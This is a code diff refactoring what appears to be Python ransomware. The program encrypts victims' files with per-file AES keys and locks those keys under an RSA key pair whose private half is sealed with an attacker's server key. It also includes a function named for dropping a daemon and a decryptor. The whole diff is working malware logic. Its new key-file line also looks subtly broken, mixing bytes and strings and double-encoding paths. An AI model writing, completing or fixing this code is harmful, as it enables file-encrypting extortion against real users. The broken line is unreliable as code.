@@ -46,7 +46,6 @@ def encrypt_priv_key(msg, key):
 
 
 def start_encryption(files):
-    AES_and_base64_path = []
     for found_file in files:
         try:
             found_file = base64.b64decode(found_file)
@@ -65,10 +64,9 @@ def start_encryption(files):
 
                     base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
 
-                    AES_and_base64_path.append((key, base64_new_file_name))
+                    yield (key, base64_new_file_name)
         except:
             continue
-    return AES_and_base64_path
 
 
 def menu():
@@ -89,45 +87,28 @@ def menu():
     encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                     variables.server_public_key)
 
-    with open(variables.encrypted_client_private_key_path, 'wb') as output:
-        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
-
-    with open(variables.client_public_key_path, 'wb') as f:
-        f.write(Client_public_key)
-
     # Client_private_key = None
     # rsa_object = None
     # del rsa_object
     # del Client_private_key
     # gc.collect()
 
+    with open(variables.encrypted_client_private_key_path, 'wb') as output:
+        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
+
+    with open(variables.client_public_key_path, 'wb') as f:
+        f.write(Client_public_key)
+
     client_public_key_object =  RSA.importKey(Client_public_key)
     client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)
 
-
     # FILE ENCRYPTION STARTS HERE !!!
-    aes_keys_and_base64_path = start_encryption(files)
-    enc_aes_key_and_base64_path = []
-
-    for _ in aes_keys_and_base64_path:
-        aes_key = _[0]
-        base64_path = _[1]
-
-        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
-        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
-
-    # aes_keys_and_base64_path = None
-    # del aes_keys_and_base64_path
-    # gc.collect()
-
     with open(variables.aes_encrypted_keys_path, 'w') as f:
-        for _ in enc_aes_key_and_base64_path:
-            line = base64.b64encode(_[0]).decode('utf-8') + " " + _[1] + "\n"
-            f.write(line)
+        for (aes_key, base64_path) in start_encryption(files):
+            encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
 
-    # enc_aes_key_and_base64_path = None
-    # del enc_aes_key_and_base64_path
-    # gc.collect()
+            line = base64.b64encode(base64_path).decode('utf-8') + " " + encrypted_aes_key + "\n"
+            f.write(line)
 
 
 def drop_daemon_and_decryptor():
